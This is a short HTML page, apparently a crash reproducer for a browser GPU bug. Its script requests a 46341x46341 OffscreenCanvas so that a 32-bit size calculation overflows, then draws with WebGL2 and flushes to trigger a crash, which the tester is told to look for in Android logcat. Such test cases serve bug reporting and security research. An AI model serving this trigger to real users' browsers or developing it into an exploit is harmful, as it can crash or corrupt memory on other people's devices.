<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
(async function() {
  const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
  try {
    // Use dimensions that cause 32‑bit product to wrap to a small value
    const w = 46341;
    const h = 46341;
    const canvas = new OffscreenCanvas(w, h);
    const gl = canvas.getContext('webgl2', {
      powerPreference: 'high-performance',
      failIfMajorPerformanceCaveat: false
    });
    if (!gl) return log('WebGL2 not supported');
    log('Context created with canvas ' + w + 'x' + h);
    // Force a draw to trigger command buffer submission
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.flush();
    log('Clear flushed – check logcat for crash');
  } catch(e) {
    log('Error: ' + e.message);
  }
})();
</script>
</body>
</html>
